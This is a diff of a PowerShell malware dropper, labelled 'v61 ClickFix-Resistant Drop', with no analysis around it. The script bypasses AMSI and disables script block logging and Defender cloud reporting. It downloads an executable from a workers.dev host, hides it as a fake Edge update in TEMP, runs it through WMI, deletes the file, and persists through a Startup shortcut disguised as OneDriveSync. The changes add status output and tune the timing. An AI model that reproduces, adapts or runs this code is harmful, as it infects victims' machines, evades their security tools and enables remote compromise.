@@ -1,7 +1,5 @@
 $ErrorActionPreference = 'SilentlyContinue'
-
-# Delayed start to avoid immediate scan
-Start-Sleep -Milliseconds (Get-Random -Minimum 1200 -Maximum 2500)
+Write-Host "[+] v61 ClickFix-Resistant Drop started at $(Get-Date)" -ForegroundColor Green
 
 # Obfuscated AMSI Bypass
 $z = 'AmsiUtils'; $y = 'amsiInitFailed'
@@ -9,10 +7,7 @@ $z = 'AmsiUtils'; $y = 'amsiInitFailed'
 
 # SBL Disable
 $settings = [Ref].Assembly.GetType('System.Management.Automation.Utils').GetField('cachedGroupPolicySettings','NonPublic,Static').GetValue($null)
-if ($settings) {
-    $settings['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging'] = @{}
-    $settings['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging']['EnableScriptBlockLogging'] = 0
-}
+if($settings){$settings['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging'] = @{};$settings['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging']['EnableScriptBlockLogging'] = 0}
 
 # MAPS Kill
 $k = "HKCU:\Software\Microsoft\Windows Defender\Spynet"
@@ -23,6 +18,7 @@ Set-ItemProperty $k "SpyNetReporting" 0 -Type DWord -Force
 # Download + Drop
 $u = "https://aged-mountain-614b.natalia-kush82.workers.dev/update"
 $b = (New-Object Net.WebClient).DownloadData($u)
+Write-Host "[+] Downloaded payload: $($b.Length) bytes" -ForegroundColor Green
 
 $r = [Guid]::NewGuid().ToString("N").Substring(0,8)
 $t = "$env:TEMP\MicrosoftEdgeUpdate_$r.exe"
@@ -32,19 +28,24 @@ Unblock-File $t -EA 0
 Remove-Item $t -Stream Zone.Identifier -EA 0
 [System.IO.File]::SetAttributes($t, 'Hidden')
 
-Start-Sleep -Milliseconds (Get-Random -Minimum 800 -Maximum 1600)
+Write-Host "[+] Staged as: $t" -ForegroundColor Yellow
+
+Start-Sleep -Milliseconds (Get-Random -Minimum 700 -Maximum 1600)
 
 try {
     Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList $t | Out-Null
     Start-Process $t -WindowStyle Hidden -EA 0
-} catch {}
+    Write-Host "[+] Executed successfully" -ForegroundColor Green
+} catch {
+    Write-Host "[-] Execution error" -ForegroundColor Red
+}
 
-# Cleanup
-Start-Job -ScriptBlock { param($f) Start-Sleep -Seconds 1.2; Remove-Item $f -Force -EA 0 } -ArgumentList $t | Out-Null
+# Fast cleanup
+Start-Job -ScriptBlock { param($f) Start-Sleep -Seconds 1.1; Remove-Item $f -Force -EA 0 } -ArgumentList $t | Out-Null
 
 # Persistence
 $flag = "$env:TEMP\persist_$([Environment]::MachineName.GetHashCode()).dat"
-if (-not (Test-Path $flag)) {
+if(-not (Test-Path $flag)){
     $lnk = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\OneDriveSync.lnk"
     $w = New-Object -ComObject WScript.Shell
     $s = $w.CreateShortcut($lnk)
@@ -54,4 +55,6 @@ if (-not (Test-Path $flag)) {
     New-Item $flag -Force | Out-Null
 }
 
-Start-Sleep -Seconds 180
+Write-Host "[+] v61 running - waiting for callback..." -ForegroundColor Magenta
+Start-Sleep -Seconds 240
+Write-Host "[+] v61 completed" -ForegroundColor Green
